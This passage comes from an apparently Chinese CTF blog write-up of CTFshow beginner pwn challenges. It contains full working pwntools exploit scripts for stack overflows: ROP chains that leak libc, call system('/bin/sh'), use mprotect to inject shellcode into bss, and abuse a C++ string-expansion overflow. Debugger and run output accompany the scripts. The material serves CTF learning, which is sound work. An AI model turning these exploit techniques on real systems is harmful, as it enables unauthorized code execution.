class="comment">#libc=LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line"><span class="comment">#libc_base=puts-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">payload=cyclic(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 549</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">0x7ffff7e27be0</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag pwn</span><br></pre></td></tr></table></figure>

<p>目的是进一步学习mprotect函数</p>
<p>主要流程如下：</p>
<ol>
<li>泄漏内存地址,通过计算得到libc地址</li>
<li>通过mprotect函数来修改一段区域的权限</li>
<li>向这段区域写入shellcode</li>
<li>跳转到写入shellcode的区域</li>
</ol>
<p>显然，这样对做这题来讲可能会更加繁琐，但是跟着一步步调试后，会对mprotect这个函数有更加深刻的认识了。</p>
<p>检查保护：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位开启NX，部分开启RELRO</p>
<p>首先第一步：泄漏内存地址,通过计算得到libc地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28127)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span> </span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] libc_base = 0x7ffff7dcd0000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello CTFshow</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p>第二步：通过mprotect函数来修改bss的权限为rwx:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;bash&#x27;, &#x27;-c&#x27;] #当前窗口</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x04007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rsi ; ret&quot;</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x2601f</span></span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rdx ;ret &quot;</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x142c92</span></span><br><span class="line"><span class="comment">######### step2 : mprotect_bss_to_rwx</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(bss_page_addr)</span><br><span class="line">payload+= p64(pop_rsi_ret)</span><br><span class="line">payload+= p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+= p64(pop_rdx_ret)</span><br><span class="line">payload+= p64(<span class="number">0x7</span>)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)</span><br><span class="line">          0x400000           0x401000 r-xp     1000       0 pwn</span><br><span class="line">          0x601000           0x602000 r--p     1000    1000 pwn</span><br><span class="line">          0x602000           0x603000 rw-p     1000    2000 pwn</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)</span><br><span class="line">          0x400000           0x401000 r-xp     1000       0 pwn</span><br><span class="line">          0x601000           0x602000 rwxp     1000    1000 pwn</span><br><span class="line">          0x602000           0x603000 rw-p     1000    2000 pwn</span><br><span class="line">   ...</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>第三步：向bss段中写入shellcode:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28127)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rsi ; ret&quot;</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x2601f</span></span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rdx ;ret &quot;</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x142c92</span></span><br><span class="line"><span class="comment">######### step2 : mprotect_bss_to_rwx</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(bss_page_addr)</span><br><span class="line">payload+= p64(pop_rsi_ret)</span><br><span class="line">payload+= p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+= p64(pop_rdx_ret)</span><br><span class="line">payload+= p64(<span class="number">0x7</span>)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">######### step3 : gets_shellcode_to_bss</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(shellcode_addr)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看到此时shellcode已经写入我们构造的bss段<br>最后一步就是跳转至此进行get shell了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28127)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rsi ; ret&quot;</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x2601f</span></span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rdx ;ret &quot;</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x142c92</span></span><br><span class="line"><span class="comment">######### step2 : mprotect_bss_to_rwx</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(bss_page_addr)</span><br><span class="line">payload+= p64(pop_rsi_ret)</span><br><span class="line">payload+= p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+= p64(pop_rdx_ret)</span><br><span class="line">payload+= p64(<span class="number">0x7</span>)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">######### step3 : gets_shellcode_to_bss</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(shellcode_addr)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">######### step4 : ret2bss</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(shellcode_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn51"><a href="#pwn51" class="headerlink" title="pwn51"></a>pwn51</h2><p>Hint：I‘m IronMan</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位关闭栈保护以及PIE</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_80492E6(&amp;a1);</span><br><span class="line">  sub_8049343();</span><br><span class="line">  alarm(<span class="number">0x1Eu</span>);</span><br><span class="line">  sub_8049059();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别跟进这几个函数，然后修改函数名，便于分析：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  logo(&amp;a1);</span><br><span class="line">  alarm(<span class="number">0x1Eu</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进漏洞函数ctfshow：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-Ch] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-8h] [ebp-80h]</span></span><br><span class="line">  _BYTE v8[<span class="number">12</span>]; <span class="comment">// [esp+0h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">24</span>]; <span class="comment">// [esp+2Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">24</span>]; <span class="comment">// [esp+44h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Who are you?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x20u</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;unk_804D0A0, &amp;unk_804A350);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, s);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v10, &amp;unk_804D0B8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v11, &amp;unk_804D0A0);</span><br><span class="line">  sub_8048F06(v8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v11, v11, v10);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v10, v6, v7);</span><br><span class="line">  <span class="keyword">if</span> ( sub_80496D6(v8) &gt; <span class="number">1u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;unk_804D0A0, &amp;unk_804A350);</span><br><span class="line">    v0 = sub_8049700(v8, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_8049722(v0, &amp;unk_804A350) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = sub_8049700(v8, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_80496D6(v8);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt;= i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, <span class="string">&quot;IronMan&quot;</span>);</span><br><span class="line">      v3 = sub_8049700(v8, i);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  src = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str(&amp;unk_804D0A0);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, src);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Wow!you are:%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> sub_8049616(v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，与我们平时分析的不太一样，这个程序是c++写的。在往s中read的时候大小没有问题，但是程序在下面将字符”I”替换成 了”IronMan”，最后在strcpy的时候发生了溢出。只需要简单计算一下 1 </p>
<p>- 7 ，那么在输入16个“I” 就会被替换为 16 * 7 &#x3D; 112个字符，而s距ebp的距离为 0x6c &#x3D; 108</p>
<p>正常溢出覆盖到返回地址就是 cyclic(0x6c+4) &#x3D; cyclic(112) ,输入16个I刚好替换成 16个”IronMan”，刚好是112个，也就刚好覆盖到返回地址</p>
<p>按住shift + F12查看一下字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:0804A331	00000012	C	cat /ctfshow_flag</span><br></pre></td></tr></table></figure>

<p>看到有 “cat &#x2F;ctfshow_flag”关键字符串，进行查看在哪里进行了调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804902E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有PIE和canary直接利用即可。再覆盖到返回地址后加上上述的后门函数地址即可获得flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28167)</span></span><br><span class="line">get_flag = <span class="number">0x804902E</span></span><br><span class="line">payload = <span class="string">b&quot;I&quot;</span>*<span class="number">16</span> + p32(get_flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 906</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Who are you?</span><br><span class="line">    * *************************************</span><br><span class="line">Who are you?</span><br><span class="line">Wow!you are:IronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronMan.\x90\x04\x08</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn52"><a href="#pwn52" class="headerlink" title="pwn52"></a>pwn52</h2><p>Hint：迎面走来的flag让我如此蠢蠢欲动</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位关闭栈保护与PIE</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是经典的栈溢出漏洞，再查看一下程序的敏感字符串,发现了flag函数：</p>
